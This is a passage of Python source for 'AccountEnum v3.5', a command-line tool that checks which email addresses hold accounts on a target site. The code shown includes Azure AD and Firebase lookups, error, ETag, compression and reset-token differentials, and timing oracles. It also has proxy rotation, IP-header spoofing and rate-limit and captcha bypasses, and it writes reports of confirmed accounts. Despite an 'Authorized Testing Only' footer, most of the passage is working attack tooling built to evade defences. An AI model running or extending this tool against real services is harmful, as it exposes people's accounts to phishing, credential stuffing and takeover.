                print(f"  {Fore.WHITE}[ENTROPY] {ep.url}: no significant entropy differences{Style.RESET_ALL}")

    def behavioral_analysis(self):
        if not self.results:
            return
        print(f"\n{Fore.CYAN}[*] Phase 18: Behavioral Clustering Analysis{Style.RESET_ALL}")
        analysis = BehavioralCluster.cluster_responses(self.results)
        print(f"  Status distribution: {analysis.get('status_distribution', {})}")
        print(f"  Existing: {analysis.get('existing_count', 0)} | Not found: {analysis.get('not_found_count', 0)}")
        if analysis.get("clean_split"):
            print(f"  {Fore.GREEN}[CLUSTER] Clean split: existing={analysis['exist_status']}, not_found={analysis['not_found_status']}{Style.RESET_ALL}")
        unique = analysis.get("unique_statuses", [])
        if len(unique) > 1:
            print(f"  {Fore.GREEN}[CLUSTER] {len(unique)} distinct response clusters detected{Style.RESET_ALL}")

    # == v3.5 Phases ==

    def source_map_mining(self):
        if not (self.deep or self.full):
            return
        print(f"\n{Fore.CYAN}[*] Phase 19: Source Map Mining (v3.5){Style.RESET_ALL}")
        miner = SourceMapMiner(self._request, self.target, verbose=self.verbose)
        routes = miner.mine()
        if routes:
            print(f"  {Fore.GREEN}[SRCMAP] {len(routes)} auth-related routes extracted:{Style.RESET_ALL}")
            new_eps = 0
            seen = set(ep.url for ep in self.discovered_endpoints)
            for route in routes[:50]:
                full = route if route.startswith("http") else f"{self.target}{route}"
                if full in seen:
                    continue
                vec = Vector.DIRECT_CHECK
                rl = route.lower()
                if "login" in rl or "signin" in rl or "auth" in rl:
                    vec = Vector.LOGIN
                elif "register" in rl or "signup" in rl:
                    vec = Vector.REGISTER
                elif "forgot" in rl or "reset" in rl or "recover" in rl:
                    vec = Vector.PASSWORD_RESET
                probed = self._probe_endpoint_fast(full, vec)
                if probed:
                    self.discovered_endpoints.append(probed)
                    new_eps += 1
                    print(f"    {Fore.GREEN}{probed.method} {probed.url} [{probed.vector.value}]{Style.RESET_ALL}")
                elif self.verbose:
                    print(f"    {route}")
            if new_eps:
                print(f"  {Fore.GREEN}[SRCMAP] {new_eps} new live endpoints from source maps{Style.RESET_ALL}")
        else:
            print(f"  No source maps or auth routes found in JS bundles")

    def baas_detection(self):
        if not (self.deep or self.full):
            return
        print(f"\n{Fore.CYAN}[*] Phase 20: BaaS Auth Detection (v3.5){Style.RESET_ALL}")
        detector = BaaSDetector(self._request, self.target, verbose=self.verbose)
        detected = detector.detect()
        if detected:
            for provider, endpoints in detected.items():
                print(f"  {Fore.GREEN}[BAAS] {provider.upper()}: {', '.join(endpoints[:5])}{Style.RESET_ALL}")
                if provider == "firebase" and "createAuthUri" in str(endpoints):
                    print(f"    {Fore.RED}[!] Firebase createAuthUri = DIRECT email enumeration vector{Style.RESET_ALL}")
                elif provider == "supabase":
                    for sp in endpoints:
                        full = f"{self.target}{sp}" if not sp.startswith("http") else sp
                        ep = EndpointInfo(url=full, method="POST", vector=Vector.DIRECT_CHECK,
                                          email_param="email", content_type="application/json",
                                          status_code=200)
                        self.discovered_endpoints.append(ep)
        else:
            print(f"  No BaaS providers detected")

    def sso_probe(self, emails: list[str]):
        if not self.full:
            return
        print(f"\n{Fore.CYAN}[*] Phase 21: SSO Provider Probe (v3.5){Style.RESET_ALL}")
        prober = SSOProviderProber(self._request, self.target, verbose=self.verbose)
        detected = prober.probe()
        if detected:
            for provider, paths in detected.items():
                print(f"  {Fore.GREEN}[SSO] {provider.upper()}: {', '.join(paths[:3])}{Style.RESET_ALL}")

        azure_hits = 0
        for email in emails[:20]:
            result = prober.check_azure_ad(email)
            if result:
                if result.get("throttled"):
                    print(f"  {Fore.YELLOW}[AZURE] Throttled — stopping Azure AD checks{Style.RESET_ALL}")
                    break
                if_exists = result.get("if_exists")
                if if_exists == 0:
                    azure_hits += 1
                    print(f"  {Fore.GREEN}[AZURE-AD] {email} EXISTS (IfExistsResult=0){Style.RESET_ALL}")
                    existing = next((r for r in self.results if r.email == email), None)
                    if existing:
                        existing.confidence = Confidence.CONFIRMED
                        existing.evidence.insert(0, "Azure AD GetCredentialType: exists")
                    else:
                        self.results.append(EnumResult(
                            email=email, vector="azure_ad", endpoint="GetCredentialType",
                            status_code=200, response_time=0, content_length=0,
                            exists=True, confidence=Confidence.HIGH,
                            evidence=["Azure AD GetCredentialType: IfExistsResult=0"],
                        ))
                elif if_exists == 1 and self.verbose:
                    print(f"    [AZURE-AD] {email}: not found (IfExistsResult=1)")
        if azure_hits:
            print(f"  {Fore.GREEN}[AZURE-AD] {azure_hits} email(s) confirmed via Azure AD{Style.RESET_ALL}")

    def xmlrpc_probe(self):
        print(f"\n{Fore.CYAN}[*] Phase 22: XML-RPC / CMS Probe (v3.5){Style.RESET_ALL}")
        prober = XMLRPCProber(self._request, self.target, verbose=self.verbose)
        wp_eps = prober.probe_wordpress()
        legacy_eps = prober.probe_legacy()
        all_eps = wp_eps + legacy_eps
        if all_eps:
            seen = set(ep.url for ep in self.discovered_endpoints)
            new = 0
            for ep in all_eps:
                if ep.url not in seen:
                    self.discovered_endpoints.append(ep)
                    new += 1
                    print(f"  {Fore.GREEN}[CMS] {ep.method} {ep.url} [{ep.vector.value}]{Style.RESET_ALL}")
            if new:
                print(f"  {Fore.GREEN}[CMS] {new} new endpoints from CMS probing{Style.RESET_ALL}")
        else:
            print(f"  No CMS/XML-RPC endpoints found")

    def prevalidation_discovery(self):
        if not (self.deep or self.full):
            return
        print(f"\n{Fore.CYAN}[*] Phase 23: Pre-validation Endpoint Discovery (v3.5){Style.RESET_ALL}")
        disc = PrevalidationDiscovery(self._request, self.target, self.subdomains[:3],
                                      verbose=self.verbose)
        found = disc.discover()
        if found:
            seen = set(ep.url for ep in self.discovered_endpoints)
            new = 0
            for ep in found:
                if ep.url not in seen:
                    self.discovered_endpoints.append(ep)
                    new += 1
                    print(f"  {Fore.GREEN}[PREVAL] {ep.method} {ep.url} (param={ep.email_param}){Style.RESET_ALL}")
            if new:
                print(f"  {Fore.GREEN}[PREVAL] {new} pre-validation endpoints found{Style.RESET_ALL}")
        else:
            print(f"  No pre-validation endpoints found")

    def multitenant_lookup(self, emails: list[str]):
        if not self.full:
            return
        print(f"\n{Fore.CYAN}[*] Phase 24: Multi-tenant / Workspace Lookup (v3.5){Style.RESET_ALL}")
        lookup = MultiTenantLookup(self._request, self.target, verbose=self.verbose)
        findings = lookup.lookup(emails)
        if findings:
            for f in findings:
                print(f"  {Fore.GREEN}[TENANT] {f['url']} -> {f['domain']}: {list(f['response'].keys())[:5]}{Style.RESET_ALL}")
        else:
            print(f"  No multi-tenant/workspace endpoints responding")

    def api_version_brute(self):
        if not (self.deep or self.full):
            return
        print(f"\n{Fore.CYAN}[*] Phase 25: API Version Brute-Force (v3.5){Style.RESET_ALL}")
        bruter = APIVersionBrute(self._request, self.target, verbose=self.verbose)
        found = bruter.brute()
        if found:
            seen = set(ep.url for ep in self.discovered_endpoints)
            new = 0
            for ep in found:
                if ep.url not in seen:
                    self.discovered_endpoints.append(ep)
                    new += 1
            if new:
                print(f"  {Fore.GREEN}[APIVER] {new} new endpoints from API version brute (v1-v10){Style.RESET_ALL}")
        else:
            print(f"  No additional API versions found")

    def double_submit_analysis(self, emails: list[str]):
        if not self.full:
            return
        register_eps = [ep for ep in self.discovered_endpoints
                        if ep.vector == Vector.REGISTER and not ep.captcha_enforced
                        and ep.url in self.baselines]
        if not register_eps:
            return
        print(f"\n{Fore.CYAN}[*] Phase 26: Double-Submit Differential (v3.5){Style.RESET_ALL}")
        detector = DoubleSubmitDetector(self._request, verbose=self.verbose)
        hits = 0
        for email in emails[:15]:
            for ep in register_eps[:2]:
                result = detector.check(ep, email, self._send_enum_request)
                if result and result.get("exists"):
                    hits += 1
                    sig = result.get("signal", "status/length diff")
                    print(f"  {Fore.GREEN}[DOUBLE] {email} -> '{sig}'{Style.RESET_ALL}")
                    existing = next((r for r in self.results if r.email == email), None)
                    if existing:
                        existing.evidence.append(f"double-submit: '{sig}'")
                        if existing.confidence in (Confidence.LOW, Confidence.UNKNOWN):
                            existing.confidence = Confidence.MEDIUM
                    else:
                        self.results.append(EnumResult(
                            email=email, vector=ep.vector.value,
                            endpoint=ep.url, status_code=0,
                            response_time=0, content_length=0,
                            exists=True, confidence=Confidence.MEDIUM,
                            evidence=[f"double-submit signal: '{sig}'"],
                        ))
                self.rate_handler.wait(ep.url)
        if hits:
            print(f"  {Fore.GREEN}[DOUBLE] {hits} additional hits via double-submit{Style.RESET_ALL}")
        else:
            print(f"  No double-submit signals detected")

    def etag_cache_analysis(self, emails: list[str]):
        if not self.full:
            return
        active = [ep for ep in self.discovered_endpoints
                  if ep.url in self.baselines and not ep.captcha_enforced]
        if not active:
            return
        print(f"\n{Fore.CYAN}[*] Phase 27: ETag / Cache Header Differential (v3.5){Style.RESET_ALL}")
        analyzer = ETagDifferential(self._request, verbose=self.verbose)
        baseline_email = f"etagbase_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
        findings = 0
        for ep in active[:3]:
            for email in emails[:10]:
                diffs = analyzer.compare(ep, baseline_email, email, self._send_enum_request)
                if diffs:
                    findings += 1
                    for header, vals in diffs.items():
                        print(f"  {Fore.GREEN}[ETAG] {email} @ {ep.url}: {header} differs{Style.RESET_ALL}")
                        existing = next((r for r in self.results if r.email == email), None)
                        if existing:
                            existing.evidence.append(f"cache header diff: {header}")
                self.rate_handler.wait(ep.url)
        if findings:
            print(f"  {Fore.GREEN}[ETAG] {findings} cache header differentials detected{Style.RESET_ALL}")
        else:
            print(f"  No cache header differentials found")

    def error_classification(self, emails: list[str]):
        active = [ep for ep in self.discovered_endpoints
                  if ep.url in self.baselines and not ep.captcha_enforced]
        if not active:
            return
        print(f"\n{Fore.CYAN}[*] Phase 28: Error Classification Engine (v3.5){Style.RESET_ALL}")
        baseline_email = f"errclass_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
        enum_signals = 0
        for ep in active[:5]:
            baseline_resp, _ = self._send_enum_request(ep, baseline_email)
            if not baseline_resp:
                continue
            base_body = baseline_resp.text or ""
            base_cats = ErrorClassifier.classify(base_body)
            if self.verbose:
                print(f"  {ep.url} baseline: {base_cats}")

            for email in emails[:15]:
                resp, _ = self._send_enum_request(ep, email)
                if not resp:
                    continue
                diff = ErrorClassifier.differential(base_body, resp.text or "")
                if diff["enum_signal"]:
                    enum_signals += 1
                    print(f"  {Fore.GREEN}[ERROR] {email}: enum signal ({diff['target_categories']} vs baseline {diff['baseline_categories']}){Style.RESET_ALL}")
                    existing = next((r for r in self.results if r.email == email), None)
                    if existing:
                        existing.evidence.append(f"error class diff: {diff['diff']}")
                        if existing.confidence in (Confidence.LOW, Confidence.UNKNOWN):
                            existing.confidence = Confidence.MEDIUM
                    else:
                        self.results.append(EnumResult(
                            email=email, vector=ep.vector.value,
                            endpoint=ep.url, status_code=resp.status_code,
                            response_time=0, content_length=len(resp.text or ""),
                            exists=True, confidence=Confidence.MEDIUM,
                            evidence=[f"error category shift: {diff['baseline_categories']} -> {diff['target_categories']}"],
                        ))
                self.rate_handler.wait(ep.url)
        if enum_signals:
            print(f"  {Fore.GREEN}[ERROR] {enum_signals} enumeration signals via error classification{Style.RESET_ALL}")
        else:
            print(f"  No error classification differentials found")

    def reset_token_analysis(self, emails: list[str]):
        if not self.full:
            return
        reset_eps = [ep for ep in self.discovered_endpoints
                     if ep.vector == Vector.PASSWORD_RESET and not ep.captcha_enforced
                     and ep.url in self.baselines]
        if not reset_eps:
            return
        print(f"\n{Fore.CYAN}[*] Phase 29: Password Reset Token Analysis (v3.5){Style.RESET_ALL}")
        analyzer = ResetTokenAnalyzer(self._request, verbose=self.verbose)
        baseline_email = f"resetprobe_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
        hits = 0
        for ep in reset_eps[:2]:
            for email in emails[:10]:
                result = analyzer.analyze(ep, baseline_email, email, self._send_enum_request)
                if result:
                    if result.get("exists_signal"):
                        hits += 1
                        print(f"  {Fore.GREEN}[RESET-TOKEN] {email}: token issued only for target (exists){Style.RESET_ALL}")
                        existing = next((r for r in self.results if r.email == email), None)
                        if existing:
                            existing.evidence.append("reset token: target-only issuance")
                            existing.confidence = Confidence.HIGH
                        else:
                            self.results.append(EnumResult(
                                email=email, vector="password_reset",
                                endpoint=ep.url, status_code=200,
                                response_time=0, content_length=0,
                                exists=True, confidence=Confidence.HIGH,
                                evidence=["reset token issued only for target email"],
                            ))
                    elif result.get("token_length_diff", 0) > 5:
                        if self.verbose:
                            print(f"    {email}: token length diff={result['token_length_diff']}")
                self.rate_handler.wait(ep.url)
        if hits:
            print(f"  {Fore.GREEN}[RESET-TOKEN] {hits} email(s) confirmed via token analysis{Style.RESET_ALL}")
        else:
            print(f"  No reset token differentials found")

    def compression_oracle(self, emails: list[str]):
        if not self.full:
            return
        active = [ep for ep in self.discovered_endpoints
                  if ep.url in self.baselines and not ep.captcha_enforced]
        if not active:
            return
        print(f"\n{Fore.CYAN}[*] Phase 30: Response Compression Oracle (v3.5){Style.RESET_ALL}")
        oracle = CompressionOracle(self._request, verbose=self.verbose)
        baseline_email = f"comprobe_{hashlib.md5(os.urandom(4)).hexdigest()[:6]}@example.com"
        findings = 0
        for ep in active[:3]:
            for email in emails[:10]:
                result = oracle.check(ep, baseline_email, email, self._send_enum_request)
                if result and result.get("significant"):
                    findings += 1
                    diff = result.get("length_diff", result.get("raw_byte_diff", 0))
                    if self.verbose:
                        print(f"    {email}: compressed length diff={diff}")
                    existing = next((r for r in self.results if r.email == email), None)
                    if existing:
                        existing.evidence.append(f"compression oracle: size diff={diff}")
                self.rate_handler.wait(ep.url)
        if findings:
            print(f"  {Fore.GREEN}[COMPRESS] {findings} significant compressed response differentials{Style.RESET_ALL}")
        else:
            print(f"  No compression oracle signals (responses may not be compressed)")

    # == Reporting ==

    def report(self, output: Optional[str] = None, fmt: str = "all"):
        self._print_summary()
        if output:
            base = output.rsplit(".", 1)[0] if "." in output else output
            if fmt in ("json", "all"):
                self._export_json(f"{base}.json")
            if fmt in ("csv", "all"):
                self._export_csv(f"{base}.csv")
            if fmt in ("html", "all"):
                self._export_html(f"{base}.html")

    def _print_summary(self):
        print(f"\n{Fore.CYAN}{'='*65}")
        print(f"  RESULTS SUMMARY")
        print(f"{'='*65}{Style.RESET_ALL}\n")
        print(f"  Target:         {self.target}")
        print(f"  WAF:            {self.waf_detected or 'none detected'}")
        print(f"  Tech:           {json.dumps(self.tech_stack) if self.tech_stack else 'unknown'}")
        print(f"  Endpoints:      {len(self.discovered_endpoints)} found, {len(self.baselines)} testable")
        print(f"  Proxies:        {self.proxy_rotator.alive_count} alive")
        print(f"  Rate limits:    {self.rate_handler.total_429} hits")
        print(f"  Subdomains:     {len(self.subdomains)} found")
        print(f"  Catch-all:      {'YES' if self.catchall_detected else 'no'}")
        print(f"  IDOR findings:  {len(self.idor_results)}")
        print(f"  2FA chains:     {len(self.multistep_chains)}")
        print(f"  Total results:  {len(self.results)}")

        deduped: dict[str, EnumResult] = {}
        for r in self.results:
            if r.exists is not True:
                continue
            key = r.email
            if key not in deduped or self._conf_rank(r.confidence) > self._conf_rank(deduped[key].confidence):
                deduped[key] = r

        confirmed = {e: r for e, r in deduped.items() if r.confidence in (Confidence.CONFIRMED, Confidence.HIGH)}
        medium = {e: r for e, r in deduped.items() if r.confidence == Confidence.MEDIUM}
        low = {e: r for e, r in deduped.items() if r.confidence == Confidence.LOW}

        if confirmed:
            print(f"\n  {Fore.RED}Confirmed / High ({len(confirmed)}):{Style.RESET_ALL}")
            for email, r in sorted(confirmed.items()):
                print(f"    {email} [{r.confidence.value}] via {r.vector}")
                for ev in r.evidence[:3]:
                    print(f"      {ev}")
        if medium:
            print(f"\n  {Fore.YELLOW}Medium ({len(medium)}):{Style.RESET_ALL}")
            for email, r in sorted(medium.items()):
                print(f"    {email} [{r.confidence.value}] via {r.vector}")
                print(f"      {r.evidence[0] if r.evidence else ''}")
        if low:
            print(f"\n  {Fore.WHITE}Low ({len(low)}):{Style.RESET_ALL}")
            for email, r in sorted(low.items()):
                print(f"    {email} via {r.vector}")
        if not deduped:
            print(f"\n  {Fore.GREEN}No accounts confirmed as existing{Style.RESET_ALL}")

        if self.password_policy.policies:
            print(f"\n  {Fore.CYAN}Password Policies:{Style.RESET_ALL}")
            for url, pol in self.password_policy.policies.items():
                active = {k: v for k, v in pol.items() if v is not None}
                if active:
                    print(f"    {url}: {json.dumps(active)}")
        if self.lockout_detector.locked:
            print(f"\n  {Fore.YELLOW}Lockout detected on:{Style.RESET_ALL}")
            for ep in self.lockout_detector.locked:
                print(f"    {ep}")
        if self.idor_results:
            print(f"\n  {Fore.RED}IDOR Findings:{Style.RESET_ALL}")
            for idor in self.idor_results:
                print(f"    {idor['url']} -- {idor.get('email', 'data exposed')}")
        if self.multistep_chains:
            print(f"\n  {Fore.CYAN}Multi-Step Auth Chains:{Style.RESET_ALL}")
            for chain in self.multistep_chains:
                print(f"    {chain['email']} -> {chain.get('step2_type', 'unknown')}")
        if self.side_effects:
            print(f"\n  {Fore.YELLOW}Registration Side Effects:{Style.RESET_ALL}")
            for url, se in self.side_effects.items():
                print(f"    {url}: creates={se.get('creates_account')}, emails={se.get('sends_email')}")
        print(f"\n{'='*65}\n")

    def _conf_rank(self, c: Confidence) -> int:
        return {Confidence.CONFIRMED: 4, Confidence.HIGH: 3, Confidence.MEDIUM: 2, Confidence.LOW: 1, Confidence.UNKNOWN: 0}.get(c, 0)

    def _export_json(self, path: str):
        data = {
            "meta": {
                "target": self.target,
                "scan_time": datetime.now().isoformat(),
                "waf": self.waf_detected,
                "tech_stack": self.tech_stack,
                "api_versions": self.api_versions,
                "proxy_count": self.proxy_rotator.alive_count,
                "rate_limit_hits": self.rate_handler.total_429,
                "subdomains": self.subdomains,
                "catchall": self.catchall_detected,
            },
            "endpoints": [
                {
                    "url": ep.url, "method": ep.method, "vector": ep.vector.value,
                    "captcha": ep.captcha_enforced, "captcha_type": ep.captcha_type,
                    "csrf": ep.requires_csrf, "waf": ep.waf,
                }
                for ep in self.discovered_endpoints
            ],
            "password_policies": self.password_policy.policies,
            "idor_findings": self.idor_results,
            "multistep_chains": self.multistep_chains,
            "side_effects": self.side_effects,
            "oauth_info": {k: v for k, v in self.oauth_info.items() if isinstance(v, str)},
            "results": [
                {
                    "email": r.email, "exists": r.exists,
                    "confidence": r.confidence.value, "vector": r.vector,
                    "endpoint": r.endpoint, "evidence": r.evidence,
                    "status_code": r.status_code, "response_time": r.response_time,
                    "content_length": r.content_length,
                    "redirect": r.redirect_url,
                }
                for r in self.results if r.exists is True
            ],
            "lockouts": list(self.lockout_detector.locked),
            "interesting_headers": {k: list(set(v))[:5] for k, v in self.interesting_headers.items()},
        }
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
        print(f"  {Fore.GREEN}[+] JSON: {path}{Style.RESET_ALL}")

    def _export_csv(self, path: str):
        with open(path, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["email", "exists", "confidence", "vector", "endpoint", "evidence", "status", "time_s"])
            for r in self.results:
                if r.exists is True:
                    writer.writerow([
                        r.email, r.exists, r.confidence.value, r.vector,
                        r.endpoint, "; ".join(r.evidence[:3]),
                        r.status_code, f"{r.response_time:.3f}",
                    ])
        print(f"  {Fore.GREEN}[+] CSV: {path}{Style.RESET_ALL}")

    def _export_html(self, path: str):
        deduped: dict[str, EnumResult] = {}
        for r in self.results:
            if r.exists is not True:
                continue
            if r.email not in deduped or self._conf_rank(r.confidence) > self._conf_rank(deduped[r.email].confidence):
                deduped[r.email] = r

        rows = ""
        for email, r in sorted(deduped.items()):
            color = {"confirmed": "#ff4444", "high": "#ff6644", "medium": "#ffaa00", "low": "#888"}.get(r.confidence.value, "#888")
            rows += f"""<tr>
                <td>{html_module.escape(email)}</td>
                <td style="color:{color};font-weight:bold">{r.confidence.value.upper()}</td>
                <td>{html_module.escape(r.vector)}</td>
                <td>{html_module.escape(r.endpoint)}</td>
                <td>{html_module.escape('; '.join(r.evidence[:3]))}</td>
                <td>{r.status_code}</td>
                <td>{r.response_time:.3f}s</td>
            </tr>"""

        ep_rows = ""
        for ep in self.discovered_endpoints:
            flags = []
            if ep.captcha_enforced: flags.append(f"captcha:{ep.captcha_type}")
            if ep.waf: flags.append(f"waf:{ep.waf}")
            if ep.requires_csrf: flags.append("csrf")
            ep_rows += f"""<tr>
                <td>{html_module.escape(ep.method)}</td>
                <td>{html_module.escape(ep.url)}</td>
                <td>{html_module.escape(ep.vector.value)}</td>
                <td>{html_module.escape(', '.join(flags))}</td>
            </tr>"""

        idor_rows = ""
        for idor in self.idor_results:
            idor_rows += f"""<tr>
                <td>{html_module.escape(str(idor.get('url', '')))}</td>
                <td>{idor.get('id', '')}</td>
                <td>{html_module.escape(str(idor.get('email', '')))}</td>
                <td>{html_module.escape(', '.join(idor.get('data_keys', [])))}</td>
            </tr>"""

        report_html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>AccountEnum v3.2 Report</title>
<style>
:root {{ --bg: #0d1117; --fg: #c9d1d9; --card: #161b22; --border: #30363d; --accent: #58a6ff; }}
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{ font-family: 'Segoe UI',system-ui,sans-serif; background:var(--bg); color:var(--fg); padding:2rem; }}
h1 {{ color:var(--accent); margin-bottom:0.5rem; }}
h2 {{ color:var(--accent); margin:2rem 0 1rem; font-size:1.2rem; }}
.meta {{ background:var(--card); border:1px solid var(--border); border-radius:8px; padding:1.5rem; margin:1rem 0; display:flex; flex-wrap:wrap; gap:1rem; }}
.meta span {{ margin-right:1.5rem; }}
.meta strong {{ color:var(--accent); }}
table {{ width:100%; border-collapse:collapse; background:var(--card); border:1px solid var(--border); border-radius:8px; overflow:hidden; margin-bottom:1rem; }}
th {{ background:#1c2128; color:var(--accent); text-align:left; padding:0.75rem 1rem; font-size:0.85rem; text-transform:uppercase; }}
td {{ padding:0.6rem 1rem; border-top:1px solid var(--border); font-size:0.9rem; word-break:break-all; }}
tr:hover td {{ background:#1c2128; }}
.warn {{ background:#2d1b1b; border-color:#5c2020; padding:1rem; border-radius:8px; margin:1rem 0; }}
.footer {{ margin-top:3rem; color:#484f58; font-size:0.8rem; text-align:center; }}
</style>
</head>
<body>
<h1>AccountEnum v3.2 Report</h1>
<div class="meta">
    <span><strong>Target:</strong> {html_module.escape(self.target)}</span>
    <span><strong>WAF:</strong> {html_module.escape(self.waf_detected or 'none')}</span>
    <span><strong>Scan:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M')}</span>
    <span><strong>Endpoints:</strong> {len(self.discovered_endpoints)}</span>
    <span><strong>Subdomains:</strong> {len(self.subdomains)}</span>
    <span><strong>Hits:</strong> {len(deduped)}</span>
    <span><strong>Catch-all:</strong> {'YES' if self.catchall_detected else 'No'}</span>
    <span><strong>IDOR:</strong> {len(self.idor_results)}</span>
    <span><strong>2FA chains:</strong> {len(self.multistep_chains)}</span>
</div>
{'<div class="warn">Target appears to accept ALL emails (catch-all). Results may contain false positives.</div>' if self.catchall_detected else ''}
<h2>Enumeration Results</h2>
<table>
<tr><th>Email</th><th>Confidence</th><th>Vector</th><th>Endpoint</th><th>Evidence</th><th>Status</th><th>Time</th></tr>
{rows if rows else '<tr><td colspan="7" style="text-align:center;color:#484f58">No accounts found</td></tr>'}
</table>
<h2>Discovered Endpoints</h2>
<table>
<tr><th>Method</th><th>URL</th><th>Vector</th><th>Flags</th></tr>
{ep_rows}
</table>
{'<h2>IDOR Findings</h2><table><tr><th>URL</th><th>ID</th><th>Email</th><th>Data Keys</th></tr>' + idor_rows + '</table>' if idor_rows else ''}
<div class="footer">AccountEnum v3.2 -- Authorized Testing Only -- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
</body>
</html>"""
        with open(path, "w") as f:
            f.write(report_html)
        print(f"  {Fore.GREEN}[+] HTML: {path}{Style.RESET_ALL}")


# ================================================================
#  CLI
# ================================================================

def main():
    print(BANNER)
    p = argparse.ArgumentParser(
        description="AccountEnum v3.5 -- FBI/NCA-Tier Deep Enumeration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Examples:
          python3 account_enum.py -t https://target.com --single user@test.com
          python3 account_enum.py -t https://target.com -e emails.txt -p proxies.txt --full --deep
          python3 account_enum.py -t https://target.com -e emails.txt --full --timing -o report
          python3 account_enum.py -t https://target.com -e emails.txt --resume checkpoint.json
          python3 account_enum.py -t https://target.com -e emails.txt --plugins ./my_plugins
        """),
    )
    p.add_argument("-t", "--target", required=True, help="Target base URL")
    p.add_argument("-e", "--emails", help="Email list file (one per line)")
    p.add_argument("--single", help="Single email to check")
    p.add_argument("-p", "--proxies", help="Proxy list file")
    p.add_argument("-o", "--output", help="Output file base name")
    p.add_argument("--format", choices=["json", "csv", "html", "all"], default="all", help="Report format")
    p.add_argument("--threads", type=int, default=5, help="Threads (default: 5)")
    p.add_argument("--timeout", type=int, default=15, help="Request timeout (default: 15s)")
    p.add_argument("--delay", type=float, default=0.5, help="Delay between requests (default: 0.5s)")
    p.add_argument("--timing", action="store_true", help="Run timing oracle attack")
    p.add_argument("--timing-samples", type=int, default=10, help="Samples per email for timing")
    p.add_argument("--deep", action="store_true", help="Deep mode: JS extraction, more baselines")
    p.add_argument("--full", action="store_true", help="Full mode: ALL phases including IDOR, subdomain, OAuth, mutation, catch-all, side-effects, multi-step, session analysis")
    p.add_argument("--mobile", action="store_true", help="Use mobile user-agents")
    p.add_argument("--no-spoof", action="store_true", help="Disable IP header spoofing")
    p.add_argument("--plugins", help="Plugin directory path")
    p.add_argument("--resume", help="Checkpoint file for resume support")
    p.add_argument("--no-verify", action="store_true", help="Skip verification re-check (faster, less accurate)")
    p.add_argument("--no-osint", action="store_true", help="Skip OSINT recon phase")
    p.add_argument("--allow-captcha", action="store_true", help="Include captcha-protected endpoints (default: captchaless only)")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = p.parse_args()

    emails = []
    if args.single:
        emails = [args.single.strip()]
    elif args.emails:
        if not os.path.isfile(args.emails):
            print(f"{Fore.RED}[!] File not found: {args.emails}{Style.RESET_ALL}")
            sys.exit(1)
        with open(args.emails) as f:
            emails = list(dict.fromkeys(
                line.strip() for line in f if line.strip() and "@" in line
            ))
    else:
        print(f"{Fore.RED}[!] Provide --emails or --single{Style.RESET_ALL}")
        sys.exit(1)

    print(f"  {Fore.WHITE}Target:    {args.target}")
    print(f"  Emails:    {len(emails)}")
    print(f"  Threads:   {args.threads} (adaptive up to {min(args.threads * 4, 40)})")
    print(f"  Proxies:   {'yes' if args.proxies else 'no'}")
    print(f"  Deep:      {'yes' if args.deep else 'no'}")
    print(f"  Full:      {'yes' if args.full else 'no'}")
    print(f"  OSINT:     {'no' if args.no_osint else 'yes (16 sources)'}")
    print(f"  Captchaless: {'no (all endpoints)' if args.allow_captcha else 'yes (captcha-free only)'}")
    print(f"  Timing:    {'yes' if args.timing else 'no'}")
    print(f"  Verify:    {'no' if args.no_verify else 'yes (re-check every hit)'}")
    print(f"  IP Spoof:  {'no' if args.no_spoof else 'yes'}")
    print(f"  Mobile UA: {'yes' if args.mobile else 'no'}")
    print(f"  Plugins:   {args.plugins or 'none'}")
    print(f"  Resume:    {args.resume or 'none'}{Style.RESET_ALL}\n")

    engine = AccountEnumerator(
        target=args.target,
        proxy_file=args.proxies,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        verbose=args.verbose,
        deep=args.deep,
        spoof_ip=not args.no_spoof,
        mobile=args.mobile,
        full=args.full,
        plugin_dir=args.plugins,
        checkpoint_file=args.resume,
        no_verify=args.no_verify,
    )

    if args.allow_captcha:
        engine.captchaless_only = False

    # Phase 0: Recon
    engine.recon()

    # Phase 0a: OSINT Recon (16 free sources)
    if not args.no_osint:
        engine.osint_phase()

    # Phase 0b: Subdomain Discovery (--full)
    engine.discover_subdomains()

    # Phase 1: Endpoint Discovery
    engine.discover_endpoints()

    # Phase 2: Pre-Enumeration
    engine.test_captcha_bypasses()
    engine.detect_catchall()
    engine.detect_side_effects()

    # Phase 3: Calibration
    engine.calibrate_baselines()

    # Phase 4: Enumeration (13 signals)
    engine.enumerate(emails)

    # Phase 5: Rate Limit Bypass via Mutation (--full)
    engine.rate_limit_bypass_enum(emails)

    # Phase 6: IDOR (--full)
    engine.idor_enum()

    # Phase 7: Timing Oracle (--timing)
    if args.timing:
        engine.timing_attack(emails, samples=args.timing_samples)

    # Phase 8: OAuth Flow (--full)
    engine.oauth_enum(emails)

    # Phase 9: Multi-Step Auth (--full)
    engine.multistep_auth_enum(emails)

    # Phase 10: Password Policy (--deep or --full)
    if args.deep or args.full:
        engine.enum_password_policy()

    # Session Token Analysis (--full)
    engine.analyze_sessions(emails)

    # v3.4 Advanced Phases
    # Phase 11: Advanced Recon (DNS intel, cert intel, CORS, takeover, WebSocket, path fuzz, rate limit map)
    engine.advanced_recon()

    # Phase 12: SMTP Verification (--full)
    engine.smtp_verify(emails)

    # Phase 13: Unicode/Encoding Bypass (--full)
    engine.unicode_bypass_enum(emails)

    # Phase 14: GraphQL Batch Enumeration
    engine.graphql_batch_enum(emails)

    # Phase 15: HTTP Method Override Bypass (--deep)
    engine.method_override_scan()

    # Phase 16: JWT Token Analysis (--full)
    engine.jwt_analysis(emails)

    # Phase 17: Response Entropy Analysis (--full)
    engine.entropy_analysis(emails)

    # Phase 18: Behavioral Clustering
    engine.behavioral_analysis()

    # v3.5 Deep Phases
    # Phase 19: Source Map Mining
    engine.source_map_mining()

    # Phase 20: BaaS Auth Detection (Firebase, Supabase, Cognito, Auth0, Okta)
    engine.baas_detection()

